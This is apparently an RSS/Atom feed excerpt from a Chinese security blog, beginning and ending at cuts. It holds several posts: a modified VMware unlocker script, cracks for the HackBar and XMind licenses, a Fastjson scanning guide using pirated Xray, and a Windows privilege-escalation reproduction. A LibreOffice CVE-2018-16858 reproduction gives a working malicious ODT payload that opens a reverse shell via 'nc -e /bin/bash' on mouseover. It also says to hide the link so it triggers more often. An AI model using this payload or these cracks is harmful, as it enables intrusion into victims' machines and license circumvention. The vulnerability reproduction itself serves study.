    <content type="html"><![CDATA[<p>删除或注释 <code>win-install.cmd</code> line 9-23</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">chcp 850<br><br>net session &gt;NUL 2&gt;&amp;1<br><span class="hljs-keyword">if</span> %errorlevel% neq 0 (<br>    <span class="hljs-built_in">echo</span> Administrator privileges required! <br>    <span class="hljs-built_in">exit</span> /b<br>)<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">set</span> KeyName=<span class="hljs-string">&quot;HKLM\SOFTWARE\Wow6432Node\VMware, Inc.\VMware Player&quot;</span><br>:: delims is a TAB followed by a space<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=2* delims= &quot;</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;REG QUERY %KeyName% /v InstallPath&#x27;</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">set</span> InstallPath=%%B<br><span class="hljs-built_in">echo</span> VMware is installed at: %InstallPath%<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=2* delims= &quot;</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;REG QUERY %KeyName% /v ProductVersion&#x27;</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">set</span> ProductVersion=%%B<br><span class="hljs-built_in">echo</span> VMware product version: %ProductVersion%<br><br></code></pre></td></tr></table></figure><p>在line 24 添加 <code>set InstallPath=VMware安装路径</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> InstallPath=C:\Program Files (x86)\VMware\VMware Workstation\<br></code></pre></td></tr></table></figure><p>在line 47、line 51改为调用python脚本破解：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> unlocker.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python3</span> gettools.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>在line 29-32line中的VMware服务名字是错误的，需要修改正确服务名并加上双引号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">net stop <span class="hljs-string">&quot;VMwareHostd&quot;</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">&quot;VMAuthdService&quot;</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">&quot;VMnetDHCP&quot;</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">&quot;VMUSBArbService&quot;</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">&quot;VMware NAT Service&quot;</span> &gt; NUL 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>修改line 57-line 60：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">net start <span class="hljs-string">&quot;VMware NAT Service&quot;</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">&quot;VMnetDHCP&quot;</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">&quot;VMAuthdService&quot;</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">&quot;VMUSBArbService&quot;</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">&quot;VMwareHostd&quot;</span> &gt; NUL 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>去除破解的 <code>win-uninstall.cmd</code> 也类似，修改相应的地方即可。</p><p>完整脚本下载地址：<a href="https://github.com/Kuibagit/Resource/blob/master/MK-unlocker.zip">https://github.com/Kuibagit/Resource/blob/master/MK-unlocker.zip</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs cmd">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">setlocal</span> ENABLEEXTENSIONS<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Unlocker <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> VMware Workstation<br><span class="hljs-built_in">echo</span> =====================================<br><span class="hljs-built_in">echo</span> (c) Dave Parsons <span class="hljs-number">2011</span>-<span class="hljs-number">18</span><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> encoding parameters...<br><span class="hljs-comment">REM chcp 850</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">REM net session &gt;NUL 2&gt;&amp;1</span><br><span class="hljs-comment">REM if %errorlevel% neq 0 (</span><br><span class="hljs-comment">    REM echo Administrator privileges required! </span><br><span class="hljs-comment">    REM pause</span><br><span class="hljs-comment">    REM exit /b</span><br><span class="hljs-comment">REM )</span><br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">set</span> InstallPath=C:\Program Files (x86)\VMware\VMware Workstation<br><span class="hljs-comment">REM set KeyName=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\VMware, Inc.\VMware Workstation&quot;</span><br><span class="hljs-comment">REM :: delims is a TAB followed by a space</span><br><span class="hljs-comment">REM for /F &quot;tokens=2* delims= &quot; %%A in (&quot;REG.exe QUERY %KeyName% /v InstallPath&quot;) do set InstallPath=%%B</span><br><span class="hljs-comment">REM echo VMware is installed at: %InstallPath%</span><br><span class="hljs-comment">REM for /F &quot;tokens=2* delims= &quot; %%A in (&quot;REG.ex QUERY %KeyName% /v ProductVersion&quot;) do set ProductVersion=%%B</span><br><span class="hljs-comment">REM echo VMware product version: %ProductVersion%</span><br><br><span class="hljs-built_in">pushd</span> %~dp0<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Stopping VMware services...<br><span class="hljs-built_in">net</span> stop &quot;VMwareHostd&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop &quot;VMAuthdService&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop &quot;VMnetDHCP&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop &quot;VMUSBArbService&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop &quot;VMware NAT Service&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">taskkill</span> /F /IM vmware-tray.exe &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Backing up files...<br><span class="hljs-built_in">rd</span> /s /q .\backup &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">mkdir</span> .\backup<br><span class="hljs-built_in">mkdir</span> .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y &quot;<span class="hljs-variable">%InstallPath%</span>\x64\vmware-vmx.exe&quot; .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y &quot;<span class="hljs-variable">%InstallPath%</span>\x64\vmware-vmx-debug.exe&quot; .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y &quot;<span class="hljs-variable">%InstallPath%</span>\x64\vmware-vmx-stats.exe&quot; .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y &quot;<span class="hljs-variable">%InstallPath%</span>\vmwarebase.dll&quot; .\backup\<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Patching...<br>python3 unlocker.py<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Getting VMware Tools...<br>python3 gettools.py<br><span class="hljs-built_in">xcopy</span> /F /Y .\tools\darwin*.* &quot;<span class="hljs-variable">%InstallPath%</span>&quot;<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Starting VMware services...<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &quot;VMware NAT Service&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &quot;VMnetDHCP&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &quot;VMAuthdService&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &quot;VMUSBArbService&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> &quot;VMwareHostd&quot; &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-built_in">popd</span><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Finished!<br><span class="hljs-built_in">pause</span><br><br></code></pre></td></tr></table></figure><p>管理员权限运行 <code>win-install.cmd</code> 破解VMware</p><p><img src="https://s1.ax1x.com/2020/06/27/N6gv4S.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/06/27/N6gXAf.png" alt=""></p><p>注意:</p><p>多次运行<code>win-install.cmd</code>，容易损坏VMware许可信息，损坏后需要卸载VMware再重新安装。</p><p>Reference</p><p><a href="https://zhuanlan.zhihu.com/p/102534602">https://zhuanlan.zhihu.com/p/102534602</a></p>]]></content>
    
    
    <categories>
      
      <category>资源分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cracked</tag>
      
      <tag>Bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白嫖Xray批量检测内网Fastjson</title>
    <link href="/posts/20516be2.html"/>
    <url>/posts/20516be2.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>简文来自于@loulan-ling师傅</p></blockquote><h3 id="白嫖xray高级版">白嫖xray高级版</h3><p>最近又双叒叕白嫖到了xray的高级版，刚好高级版支持fastjson扫描，刚好解决了我最近工作问题（批量检测内网fastjson）。</p><p><img src="https://s1.ax1x.com/2020/06/13/tjjApR.jpg" alt=""></p><p><img src="https://s1.ax1x.com/2020/06/13/tjjFh9.jpg" alt=""></p><p>本次要用到xray高级版，xray反连平台</p><h3 id="配置xray反连平台">配置xray反连平台</h3><p>首先先把xray反连平台设置好，将listen_ip修改为本地ip。</p><p><img src="https://s1.ax1x.com/2020/06/13/tjOMDO.png" alt=""></p><h3 id="把当前xray所有的文件都复制到另一个xray2文件">把当前xray所有的文件都复制到另一个xray2文件</h3><p><img src="https://s1.ax1x.com/2020/06/13/tjOmgx.png" alt=""></p><h3 id="启动反连平台的xray">启动反连平台的xray</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">xray_windows_amd64.<span class="hljs-keyword">exe</span> <span class="hljs-built_in">reverse</span><br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/06/13/tjOnv6.png" alt=""></p><h3 id="接着再启动批量扫描的xray">接着再启动批量扫描的xray</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray_windows_amd64<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--plugins</span> fastjson <span class="hljs-attr">--url-file</span> url<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--html-output</span> test1.html<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/06/13/tjOKKK.png" alt=""></p><h3 id="OK-扫描完成">OK,扫描完成</h3><p>本次我主要是检测内网的fastjson漏洞，不涉及公网的，所以我的配置都是按照内网的设置来的，如果需要扫描公网的自行配制公网的设置就可以了。</p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xray</tag>
      
      <tag>Fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fixed X-Forwarded for and Cracked HackBar</title>
    <link href="/posts/eea35710.html"/>
    <url>/posts/eea35710.html</url>
    
    <content type="html"><![CDATA[<p>Firefox下x_forwarded_for无法保存设置好的headers</p><h3 id="x-forwarded-for">x_forwarded_for</h3><p>从Firefox插件目录，复制 x_forwarded_for 出来并解压.</p><p>编辑 <code>options.js</code> 156行，在newSettings前添加 <code>let</code></p><p><img src="https://s1.ax1x.com/2020/05/08/YnCOPS.png" alt=""></p><p>编辑 <code>options.html</code></p><p>删除 163行的 <code>&lt;script src=&quot;browser-polyfill.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="https://s1.ax1x.com/2020/05/08/YnCbUf.png" alt=""></p><p>修改 <code>manifest.json</code> 41行的id值，修改为任意值</p><p><img src="https://s1.ax1x.com/2020/05/08/YnCTbt.png" alt=""></p><p>删除存 <code>META-INF</code> 整个文件夹</p><p>打包为zip，然后上传到Firefox开发者中心进行签名</p><p>访问 <code>https://addons.mozilla.org/zh-CN/developers/</code> 使用Firefox账号登录（没有账号请自行注册），登录后，提交新附件组件，选【我自己托管】，按提示操作即可。成功提交后，5分钟左右即可下载签名好的插件。</p><p><img src="https://s1.ax1x.com/2020/05/08/YnCq58.png" alt=""></p><h3 id="HackBar">HackBar</h3><p>提取 插件并解压，然后编辑 <code>theme\js\hackbar-panel.js</code></p><p>注释 21-25行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">disable_hackbar</span>(<span class="hljs-params">message=<span class="hljs-literal">null</span></span>) &#123;<br>    <span class="hljs-comment">//$(&#x27;#alert-license&#x27;).removeClass(&#x27;hidden&#x27;);</span><br>    <span class="hljs-comment">//if(message)&#123;</span><br>    <span class="hljs-comment">//    $(&#x27;#alert-license span&#x27;).text(message);</span><br>    <span class="hljs-comment">//&#125;</span><br>    license_ok = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/08/YnCHVP.png" alt=""></p><p>删除存 META-INF，重新打包为zip，然后上传到Firefox开发者中心进行签名，签名完下载安装即可。</p><p><img src="https://s1.ax1x.com/2020/05/08/YnCX8g.png" alt=""></p><p>Reference</p><p><a href="https://www.bilibili.com/video/BV1j4411X7Ep?from=search&amp;seid=13023994289158065445">https://www.bilibili.com/video/BV1j4411X7Ep?from=search&amp;seid=13023994289158065445</a></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cracked</tag>
      
      <tag>HackBar</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏Chrome书签栏</title>
    <link href="/posts/3ca0a42e.html"/>
    <url>/posts/3ca0a42e.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://ae01.alicdn.com/kf/H7b8f123b3b7c429ea12026ac5ba07e60Y.jpg" alt=""></p><h3 id="隐藏Chrome顶部的书签栏有方式">隐藏Chrome顶部的书签栏有方式</h3><ul><li>1、使用官方说的：<code>Ctrl+Shift+B</code></li><li>2、Chrome扩展</li><li>3、修改注册表</li></ul><p>对于第1、2两种没什么可说的，只是“临时性”隐藏，且，只对正在浏览页面标签页有效，打开新的标签页还是可以看到，治标不治本。</p><p>比较治本的就是第3种–修改注册表</p><h3 id="操作">操作</h3><p>打开注册表 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Policies</code> 项，新建一个 <code>Google</code>项，然后其再创建子项 <code>Chrome</code>，最后创建一个名为 <code>BookmarkBarEnabled</code> 的 DWORD(32位值)，数值默认为0就行，重新打开Chrome即可。</p><h3 id="END">END</h3><p>书签栏隐藏后</p><ul><li>可以在Chrome的菜单选项进入书签（不是很方便，但可以接受）</li><li>菜单选项会多出一个【由贵单位管理】</li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows privileged</title>
    <link href="/posts/1143e85d.html"/>
    <url>/posts/1143e85d.html</url>
    
    <content type="html"><![CDATA[<h3 id="Foreword">Foreword</h3><p>很长一段时间没关注tw了，翻了翻推文，发现一则【windows提权大杀器】的推文？慢悠悠的点击看了推文与文中的截图： <code>ctftool.exe</code> 第一眼看到ctf字样，脑中闪现：CTF比赛的产物？</p><p><img src="https://ae01.alicdn.com/kf/H3d8d7218658f418d9326f5b2147f9119C.png" alt=""></p><p>后面翻了翻这“大杀器”作者的blog<a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html">文章</a>，CTF疑似微软的某种协议简写。(Google搜了一遍，没找到CTF协议具体是什么，咱啥也没明白，啥也不敢问，只是知道该协议有漏洞，可被利用进行提权)</p><h3 id="D">;D</h3><p>复现利用</p><p><code>https://github.com/taviso/ctftool</code></p><p>按作者readme中的描述，他是使用 vs 2019 与 GUI make 构建的 <code>ctftool</code> 。这两样自己机子都装有，vs 2017版应该也可以吧，然后就屁颠屁颠的去下载源码尝试自己构建。一构建一大推的报错，然后，然后，然后瞬间放弃直接del了，还是去下载作者编译好的吧。。。。。</p><p>运行 <code>ctftoll.exe</code> 执行脚本</p><p><img src="https://ae01.alicdn.com/kf/H41f72b7ba8e24bf38dd0a552cb71a5286.png" alt=""></p><p>后面重复测试，发现自安全软件已加入指纹库了。。。。。</p><p><img src="https://ae01.alicdn.com/kf/H2498e3e2f18347728ea51e49ac6fa85aB.png" alt=""></p><h3 id="Video">Video</h3><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=65238139&bvid=BV1u4411k7Wh&cid=113228058&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div><p>Reference</p><p><a href="https://github.com/taviso/ctftool">https://github.com/taviso/ctftool</a></p><p><a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html">https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>思维导图软件--XMind</title>
    <link href="/posts/ba174219.html"/>
    <url>/posts/ba174219.html</url>
    
    <content type="html"><![CDATA[<h3 id="废话">废话</h3><p>XMind是一款个人觉得还不错的维导图软件，但它是商业软件要收费的，而且还有点“小贵”。。。。购买是不可能的.</p><p><img src="https://ae01.alicdn.com/kf/H0f5ca842d94344ad88734f13b27d19763.png" alt=""></p><p>网上搜到的激活码用在XMind官网下载的<code>xmind-8-update8</code>上是用不了的，应该是新版的已经修复了，所以只能用旧版的:<code>xmind-8-update7</code></p><p>Download旧版安装包，激活插件，key<br>github：<a href="https://github.com/Kuibagit/Resource/blob/master/XMind_Crack.zip">https://github.com/Kuibagit/Resource/blob/master/XMind_Crack.zip</a> （压缩包已损坏）<br>百度云：<a href="https://pan.baidu.com/s/1h6wCRnBomNE5Btr2sB4qyQ">https://pan.baidu.com/s/1h6wCRnBomNE5Btr2sB4qyQ</a> 提取码：bzrg</p><p>下载解压安装，然后把<code>XMindCrack.jar</code>复制到XMind安装的目录下并在<code>XMind.ini</code>添加jar路径，如：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">-javaagent:C:\Program Files (x86)\XMind\XMindCrack.jar<br></code></pre></td></tr></table></figure><p>最后在host文件添加解析：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">0.0.0.0 xmind.net<br>0.0.0.0 www.xmind.net<br>0.0.0.0 xmind.cn<br>0.0.0.0 www.xmind.cn<br></code></pre></td></tr></table></figure><h3 id="END">END</h3><p>唔，后面就是打开软件输入序列号，序列号在<code>key.txt</code>，邮箱可随便填，只要是邮箱格式就行。</p><p><img src="https://ae01.alicdn.com/kf/H777b921afcf045b9a7d1341a909487beX.png" alt=""></p><p>Reference</p><p><a href="https://blog.csdn.net/m0_37447148/article/details/81167700">https://blog.csdn.net/m0_37447148/article/details/81167700</a></p>]]></content>
    
    
    <categories>
      
      <category>资源分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xmind</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libreoffice命令执行复现</title>
    <link href="/posts/cdf8e41e.html"/>
    <url>/posts/cdf8e41e.html</url>
    
    <content type="html"><![CDATA[<h3 id="Start">Start</h3><p>打开Libreoffice writer新建个’word’:</p><p>插入(Insert) =&gt; 超链接(Hyperlink) =&gt; 设置(图标)，添加个鼠标事件，保存为odt文档:</p><p><img src="https://s2.ax1x.com/2019/07/13/Z4NnxS.png" alt=""></p><p>使用解压工具解压/查看odt文件，把<code>content.xml</code>拖出来,看下里面有什么内容。</p><p><img src="https://s2.ax1x.com/2019/07/13/Z4NKKg.png" alt=""></p><p>可以看到这是类似一个加载本地的一个脚本然后使用python运行的。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:mouseover&quot;</span> xlink:href=<span class="hljs-string">&quot;vnd.sun.star.script:pythonSamples|TableSample.py$createTable?language=Python&amp;amp;location=share&quot;</span> xlink:<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;simple&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>作者文章中写到：Libreoffice自带有Python和预装部分脚本，还可以通过目录遍历访问(调用)其他脚本。</p><p>在<code>LibreOffice\program\python-core-3.5.5\lib\</code>中的<code>pydoc.py</code>通过参数cmd传递给<code>os.system()</code>执行，而且还没有做过滤。</p><p><img src="https://s2.ax1x.com/2019/07/13/Z4Nm28.png" alt=""></p><p>So，通过修改<code>content.xml</code>内容重新压缩回odt文件，当打开odt文件鼠标碰到超链接是，就会触发反弹shell。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:mouseover&quot;</span> xlink:href=<span class="hljs-string">&quot;vnd.sun.star.script:../../../program/python-core-3.5.5/lib/pydoc.py$tempfilepager(1, nc -e /bin/bash 127.0.0.1 12345)?language=Python&amp;amp;location=share&quot;</span> xlink:<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;simple&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/07/13/Z4Ne8f.png" alt=""></p><h3 id="Video">Video</h3><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=63298083&bvid=BV1c4411Q7KM&cid=109925123&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div><h3 id="END">END</h3><p>为了增加触发率，可以设置超链接为白色并遍布整个页面</p><p>新版中，python鼠标事件好像已被移除</p><p>Reference</p><p><a href="https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html">https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html</a></p><p><a href="https://testofpen.wordpress.com/2019/05/13/cve-2018-16858/">https://testofpen.wordpress.com/2019/05/13/cve-2018-16858/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>libreoffice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用Python给(blog)图片加上水印</title>
    <link href="/posts/ba9aa5f5.html"/>
    <url>/posts/ba9aa5f5.html</url>
    
    <content type="html"><![CDATA[<p>原文：<strong>州的先生</strong> 使用Python编写批量添加图片水印程序：一、代码方案 <a href="https://zmister.com/archives/990.html">https://zmister.com/archives/990.html</a></p><h3 id="准备">准备</h3><p>1、备好自己要加的水印图片，可以用PS制作或者网上找自己喜欢的。</p><p>2、待加水印图片</p><p>3、编写以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> os, traceback, time<br><span class="hljs-comment"># from operator import lt</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> PIL <span 